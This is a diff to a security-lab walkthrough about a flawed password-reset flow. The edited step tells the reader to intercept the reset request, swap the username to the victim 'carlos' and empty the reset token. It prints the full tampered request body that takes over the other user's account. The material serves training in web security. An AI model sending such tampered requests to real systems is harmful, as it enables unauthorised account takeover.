@@ -54,26 +54,37 @@ The request contains the following parameters:
 ![Step 3](lab-3-3.png)
 
 
-# Step 4: Modify the Username Parameter
+# Step 4: Modify the Request
 
-Before forwarding the intercepted request, change the username parameter from:
+Before forwarding the intercepted request, make the following changes:
+
+- Change:
 
 ```text
 username=wiener
 ```
 
-to:
+to
 
 ```text
 username=carlos
 ```
 
-Do **not** modify the `temp-forgot-password-token` or the password fields.
+- Remove the value of the `temp-forgot-password-token` parameter so it becomes:
+
+```text
+temp-forgot-password-token=
+```
+
+The modified request body looks like this:
+
+```text
+temp-forgot-password-token=&username=carlos&new-password-1=peter&new-password-2=peter
+```
 
 Forward the request.
 
-Since the application fails to verify that the reset token belongs to the supplied username, Carlos's password is reset to 
-the new password (`peter`).
+The application accepts the request and resets Carlos's password to the new password.
 
 ![Step 4](lab-3-4.png)
 
